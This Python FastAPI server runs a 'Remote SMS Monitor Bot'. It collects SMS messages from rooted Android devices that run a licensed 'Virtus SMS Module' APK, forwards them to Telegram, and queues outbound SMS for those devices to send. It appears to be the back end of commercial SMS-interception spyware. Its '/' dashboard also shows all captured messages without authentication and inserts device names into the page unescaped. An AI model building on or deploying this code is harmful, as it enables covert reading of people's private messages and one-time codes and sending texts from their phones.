import asyncio
import logging
from contextlib import asynccontextmanager
from datetime import datetime, timezone

from pathlib import Path

from fastapi import Depends, FastAPI, HTTPException, Query, Request
from fastapi.responses import FileResponse, HTMLResponse
from sqlalchemy.orm import Session

from app.config import get_settings
from app.database import Device, MonitorProfile, OutboundSMS, SMSMessage, SessionLocal, get_db, init_db
from app.firebase_pool import ensure_pool_loaded
from app.models import DeviceCreate, DeviceResponse, OutboundSMSResponse, SMSResponse, SMSWebhookPayload
from app.services import device_status, list_devices_with_counts, register_device, save_sms
from app.device_refresh import run_device_refresh_loop
from app.firebase_sms_sync import rebaseline_active_monitors, run_firebase_sms_poll_loop
from app.telegram_commands import register_bot_commands
from app.telegram_bot import build_telegram_app, notify_new_sms

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
settings = get_settings()
APK_PATH = Path(__file__).resolve().parent.parent / "apk" / "virtus-sms-module.apk"


@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db()
    db = SessionLocal()
    try:
        pool_added = ensure_pool_loaded(db)
        if pool_added:
            logger.info("Bundled Firebase pool synced: %s URLs added", pool_added)
    finally:
        db.close()

    telegram_app = build_telegram_app()

    refresh_task = asyncio.create_task(run_device_refresh_loop())
    sms_poll_task = asyncio.create_task(run_firebase_sms_poll_loop())

    if telegram_app:
        await telegram_app.initialize()
        await register_bot_commands(telegram_app.bot)
        await telegram_app.start()
        await telegram_app.updater.start_polling(drop_pending_updates=True)
        logger.info("Telegram bot started")

    async def _safe_rebaseline() -> None:
        try:
            await asyncio.wait_for(rebaseline_active_monitors(), timeout=20.0)
        except asyncio.TimeoutError:
            logger.warning("Startup rebaseline timed out")
        except Exception as exc:
            logger.warning("Startup rebaseline failed: %s", exc)

    asyncio.create_task(_safe_rebaseline())

    yield

    refresh_task.cancel()
    sms_poll_task.cancel()
    try:
        await refresh_task
    except asyncio.CancelledError:
        pass
    try:
        await sms_poll_task
    except asyncio.CancelledError:
        pass

    if telegram_app:
        await telegram_app.updater.stop()
        await telegram_app.stop()
        await telegram_app.shutdown()
        logger.info("Telegram bot stopped")


app = FastAPI(
    title="Remote SMS Monitor Bot",
    description="Webhook API + Telegram bot for remote SMS monitoring",
    version="1.1.0",
    lifespan=lifespan,
)


def verify_api_key(
    key: str = Query(..., alias="key"),
    db: Session = Depends(get_db),
) -> Device | None:
    if key == settings.api_secret_key:
        return None

    matched = db.query(Device).filter(Device.api_key == key).first()
    if matched:
        return matched

    raise HTTPException(status_code=401, detail="Invalid API key")


@app.get("/", response_class=HTMLResponse)
async def dashboard(db: Session = Depends(get_db)):
    messages = (
        db.query(SMSMessage)
        .order_by(SMSMessage.received_at.desc())
        .limit(50)
        .all()
    )
    total = db.query(SMSMessage).count()
    devices = list_devices_with_counts(db)

    rows = ""
    for sms in messages:
        time_str = sms.received_at.astimezone(timezone.utc).strftime("%d %b %Y %H:%M")
        safe_msg = sms.message.replace("<", "&lt;").replace(">", "&gt;")
        rows += f"""
        <tr>
            <td>{time_str}</td>
            <td><code>{sms.device_name}</code></td>
            <td><strong>{sms.sender}</strong></td>
            <td>{safe_msg}</td>
        </tr>"""

    device_cards = ""
    for item in devices:
        dev = item["device"]
        status = device_status(dev)
        status_color = {"online": "#22c55e", "idle": "#eab308", "offline": "#ef4444"}.get(status, "#94a3b8")
        last_seen = (
            dev.last_seen.astimezone(timezone.utc).strftime("%d %b %H:%M")
            if dev.last_seen
            else "Never"
        )
        device_cards += f"""
        <div class="device-card">
            <div class="device-top">
                <strong>{dev.name}</strong>
                <span class="status" style="color:{status_color}">● {status}</span>
            </div>
            <div class="device-meta">SMS: {item['sms_count']} | Last seen: {last_seen}</div>
        </div>"""

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Monitor Dashboard</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                background: #0f172a; color: #e2e8f0; padding: 2rem; }}
        h1 {{ margin-bottom: 0.5rem; color: #38bdf8; }}
        .stats {{ color: #94a3b8; margin-bottom: 1.5rem; }}
        .devices {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px; margin-bottom: 2rem; }}
        .device-card {{ background: #1e293b; border-radius: 8px; padding: 12px; }}
        .device-top {{ display: flex; justify-content: space-between; gap: 8px; }}
        .device-meta {{ color: #94a3b8; font-size: 0.85rem; margin-top: 8px; }}
        table {{ width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }}
        th {{ background: #334155; padding: 12px; text-align: left; font-size: 0.85rem; }}
        td {{ padding: 12px; border-top: 1px solid #334155; font-size: 0.9rem; word-break: break-word; }}
        tr:hover {{ background: #273549; }}
        code {{ background: #0f172a; padding: 2px 6px; border-radius: 4px; }}
        .empty {{ text-align: center; padding: 3rem; color: #64748b; }}
    </style>
</head>
<body>
    <h1>📱 SMS Monitor Dashboard</h1>
    <p class="stats">Total messages: <strong>{total}</strong> | Devices: <strong>{len(devices)}</strong></p>
    {"<div class='devices'>" + device_cards + "</div>" if devices else ""}
    {"<table><thead><tr><th>Time</th><th>Device</th><th>From</th><th>Message</th></tr></thead><tbody>" + rows + "</tbody></table>" if messages else '<p class="empty">No SMS messages yet. Add your device and start forwarding SMS.</p>'}
</body>
</html>"""


@app.get("/apk", response_class=HTMLResponse)
async def apk_landing_page():
    url = settings.apk_download_url
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Virtus SMS Module APK</title>
  <style>
    body {{ font-family: -apple-system, sans-serif; background:#0f172a; color:#e2e8f0;
            display:flex; min-height:100vh; align-items:center; justify-content:center; padding:24px; }}
    .card {{ background:#1e293b; border-radius:16px; padding:28px; max-width:420px; width:100%; text-align:center; }}
    h1 {{ color:#38bdf8; font-size:1.4rem; margin-bottom:8px; }}
    p {{ color:#94a3b8; line-height:1.5; margin:12px 0; }}
    a.btn {{ display:block; background:#22c55e; color:#052e16; text-decoration:none;
             font-weight:700; padding:16px 20px; border-radius:12px; margin-top:20px; font-size:1.1rem; }}
    .note {{ font-size:0.85rem; margin-top:16px; }}
  </style>
</head>
<body>
  <div class="card">
    <h1>📥 Virtus SMS Module</h1>
    <p>iPhone se download karo, Android par transfer karke install karo.</p>
    <a class="btn" href="{url}">Tap to Download APK</a>
    <p class="note">Rooted Android required. Same KEY as Telegram bot.</p>
  </div>
</body>
</html>"""


@app.get("/download/apk")
async def download_apk():
    if not APK_PATH.is_file():
        raise HTTPException(status_code=404, detail="APK not built yet. Run: cd apk && bash build-apk.sh")
    return FileResponse(
        APK_PATH,
        media_type="application/octet-stream",
        filename="virtus-sms-module.apk",
        headers={"Content-Disposition": 'attachment; filename="virtus-sms-module.apk"'},
    )


@app.get("/api/apk-config/{license_key}")
async def apk_config(license_key: str, db: Session = Depends(get_db)):
    """APK bootstrap when module DB is unavailable — returns poll config for KEY-XXXX."""
    from app.firebase_sync import resolve_apk_firebase_url, resolve_apk_poll_id
    from app.license_keys import is_valid_license_key_format, license_key_exists
    from app.services import get_active_device, get_monitor_profile

    normalized = license_key.strip().upper()
    if not is_valid_license_key_format(normalized) or not license_key_exists(normalized):
        raise HTTPException(status_code=404, detail="Unknown license key")

    profile = (
        db.query(MonitorProfile)
        .filter(MonitorProfile.license_key == normalized)
        .first()
    )
    device = None
    if profile:
        device = get_active_device(db, profile.telegram_user_id)

    if not profile or not device:
        raise HTTPException(status_code=404, detail="No active device for this key")

    firebase_url = resolve_apk_firebase_url(profile, device)
    if not firebase_url:
        raise HTTPException(status_code=404, detail="Firebase URL not configured")

    return {
        "monitoring": profile.is_monitoring,
        "ts": int(datetime.now(timezone.utc).timestamp() * 1000),
        "firebase_url": firebase_url,
        "device_id": resolve_apk_poll_id(profile, device),
        "firebase_key": normalized,
    }


@app.get("/health")
async def health(db: Session = Depends(get_db)):
    device_count = db.query(Device).count()
    return {
        "status": "ok",
        "telegram_configured": bool(settings.telegram_bot_token),
        "database": settings.database_url.split("://", 1)[0],
        "devices": device_count,
        "apk_available": APK_PATH.is_file(),
        "apk_download": settings.apk_download_url or "/download/apk",
    }


@app.post("/api/devices", response_model=DeviceResponse)
async def create_device(
    payload: DeviceCreate,
    _: None = Depends(verify_api_key),
    db: Session = Depends(get_db),
):
    device = register_device(db, payload.name, payload.api_key)
    db.commit()
    db.refresh(device)
    return DeviceResponse(
        id=device.id,
        name=device.name,
        is_active=device.is_active,
        last_seen=device.last_seen,
        sms_count=0,
        created_at=device.created_at,
    )


@app.get("/api/devices", response_model=list[DeviceResponse])
async def get_devices(
    _: None = Depends(verify_api_key),
    db: Session = Depends(get_db),
):
    items = list_devices_with_counts(db)
    return [
        DeviceResponse(
            id=item["device"].id,
            name=item["device"].name,
            is_active=item["device"].is_active,
            last_seen=item["device"].last_seen,
            sms_count=item["sms_count"],
            created_at=item["device"].created_at,
        )
        for item in items
    ]


@app.post("/api/sms", response_model=SMSResponse)
async def receive_sms(
    payload: SMSWebhookPayload,
    matched_device: Device | None = Depends(verify_api_key),
    db: Session = Depends(get_db),
):
    device_name = payload.device_name
    if matched_device:
        device_name = matched_device.name

    sms = save_sms(
        db,
        sender=payload.sender,
        message=payload.message,
        device_name=device_name,
        received_at=payload.timestamp,
        phone_number=payload.phone_number,
    )

    asyncio.create_task(notify_new_sms(sms))

    logger.info("SMS received from %s on %s", sms.sender, sms.device_name)
    return sms


@app.post("/api/sms/simple")
async def receive_sms_simple(
    request: Request,
    key: str = Query(...),
    sender: str = Query(default="unknown"),
    device: str = Query(default="android"),
    db: Session = Depends(get_db),
):
    matched_device: Device | None = None
    if key != settings.api_secret_key:
        matched_device = db.query(Device).filter(Device.api_key == key).first()
        if not matched_device:
            raise HTTPException(status_code=401, detail="Invalid API key")

    body = await request.body()
    message = body.decode("utf-8").strip() if body else ""

    if not message:
        form = await request.form()
        message = str(form.get("message", form.get("text", "")))

    if not message:
        raise HTTPException(status_code=400, detail="Message body required")

    device_name = matched_device.name if matched_device else device
    sms = save_sms(db, sender=sender, message=message, device_name=device_name)

    asyncio.create_task(notify_new_sms(sms))

    return {"ok": True, "id": sms.id, "device": device_name}


@app.get("/api/outbox", response_model=list[OutboundSMSResponse])
async def get_outbox(
    matched_device: Device | None = Depends(verify_api_key),
    db: Session = Depends(get_db),
    device: str | None = Query(default=None),
):
    query = db.query(OutboundSMS).filter(OutboundSMS.status == "pending")

    if matched_device:
        query = query.filter(OutboundSMS.device_id == matched_device.id)
    else:
        raise HTTPException(status_code=400, detail="Device API key required")

    return query.order_by(OutboundSMS.created_at.asc()).limit(20).all()


@app.post("/api/outbox/{outbox_id}/sent")
async def mark_outbox_sent(
    outbox_id: int,
    matched_device: Device | None = Depends(verify_api_key),
    db: Session = Depends(get_db),
):
    outbound = db.query(OutboundSMS).filter(OutboundSMS.id == outbox_id).first()
    if not outbound:
        raise HTTPException(status_code=404, detail="Outbox item not found")

    if matched_device and outbound.device_id != matched_device.id:
        raise HTTPException(status_code=403, detail="Not your device")

    outbound.status = "sent"
    outbound.sent_at = datetime.now(timezone.utc)
    db.commit()
    return {"ok": True, "id": outbox_id}


@app.get("/api/sms", response_model=list[SMSResponse])
async def list_sms(
    _: None = Depends(verify_api_key),
    db: Session = Depends(get_db),
    limit: int = Query(default=20, le=100),
    sender: str | None = None,
    device: str | None = None,
):
    query = db.query(SMSMessage).order_by(SMSMessage.received_at.desc())
    if sender:
        query = query.filter(SMSMessage.sender == sender)
    if device:
        query = query.filter(SMSMessage.device_name == device)
    return query.limit(limit).all()
